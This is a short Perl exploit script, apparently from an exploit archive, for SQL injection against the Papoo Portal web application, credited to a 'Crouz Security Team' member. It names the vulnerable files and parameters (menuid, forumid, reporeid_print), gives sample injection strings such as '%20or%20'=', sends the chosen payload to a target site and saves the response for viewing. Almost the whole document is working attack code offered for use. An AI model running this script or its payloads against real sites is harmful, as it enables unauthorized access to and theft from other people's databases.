# Discovered by r0t  and Additional information provided by Dj_Eyes
# & coded by Dj_Eyes From Crouz Security Team
#more information: http://secunia.com/advisories/18152/
# 
# example after run exploit:
#
# C:\papoo.pl
#
# Target (vulsite.com): site.com
# Path (kontakt.php?menuid=): /kontakt.php?menuid=    -> or other vul files
# SQL: '%20having%201=1--     ->   you must enter sql look like +URL+
# 
# '%20having%201=1--  is TRUE and ' having 1=1--  is FALSE
# example ->  SQL: '%20or%20'='
#
# Enjoy it!!!!!!!!!!!  =)

 
#!/usr/bin/perl

use LWP::Simple;

print "\n********************************************************\n";
print "*          Papoo Portal SQL Injection Exploit          *\n";
print "*                    Discovered and                    *\n";
print "*        Coded by Dj_Eyes,Crouz Security Team          *\n";
print "*            dj_eyes2005[at]yahoo[dot]com              *\n";
print "*                     Www.Crouz.coM                    *\n";
print "*   Vul Files: inhalt.php , kontakt.php , forum.php    *\n";
print "*         index.php , guestbook.php -> menuid=         *\n";
print "*  forumid and reporeid_print parameters in print.php  *\n";
print "********************************************************\n\n";
print "Target (sitevul.com): ";
$site = <STDIN>; chomp $site;
print "\nPath (ex: /kontakt.php?menueid=): ";
$path = <STDIN>; chomp $path;
print "\nSQL:";
$sql = <STDIN>; chomp $sql;
$xpl = get("http://".$site.$path) or die "[-] Not connected to $site: $!";
print "\n[+] Connected to: $site\n";
print "[%] Sending exploit...\n";
$get = get("http://".$site.$path.$sql);
print "[+] Done!\n";
open (file , ">papoo.txt") or die("[-] Not open file: $!");
print "[+] Writing on file...\n";
print file $get;
print "[+] Wrote file!\n";
print "[+] Done!\n";
close (file);
open (papoo , "papoo.txt") or die("[-] Not open file: $!");
$line = <papoo>;
open (html , ">>result.html") or die("[-] Not open file: $!");
print html substr($line,0);
close (html);
close (papoo);
print "[+] Now see result on browser!!!!!";
system ("result.html");